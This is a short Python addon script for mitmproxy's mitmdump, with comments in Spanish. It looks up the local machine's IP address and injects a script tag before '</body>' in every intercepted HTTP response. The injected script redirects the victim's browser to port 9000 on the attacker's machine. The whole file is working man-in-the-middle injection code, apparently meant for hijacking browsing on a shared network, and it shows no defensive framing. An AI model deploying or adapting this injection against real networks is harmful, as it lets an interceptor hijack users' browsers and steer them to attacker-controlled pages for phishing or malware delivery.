#redireccion con mitmproxy, usando su funcion de mitmdump que es la versión sin interfaz gráfica de mitmproxy
import socket

def get_local_ipv4():
    try:
        #Se conecta a un servidor externo para determinar la interfaz en uso
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))  #8.8.8.8 es el servir DNS de google
            local_ip = s.getsockname()[0]
        return local_ip
    except Exception as e:
        print(f"Error: {e}")
        return None

# flow representa una transacción HTTP completa
def response(flow):
    local_ipv4 = get_local_ipv4()
    # Verificamos que la IP se haya obtenido correctamente
    if local_ipv4 is None:
        return  #sale de la función en caso de que no

    # construye el script de redireccionamiento usando f-string.
    script = f"</body><script>location = 'http://{local_ipv4}:9000'</script>"
    # convierte el string a bytes (usando UTF-8) y lo usamos para el reemplazo.
    flow.response.content = flow.response.content.replace(b"</body>", script.encode('utf-8'))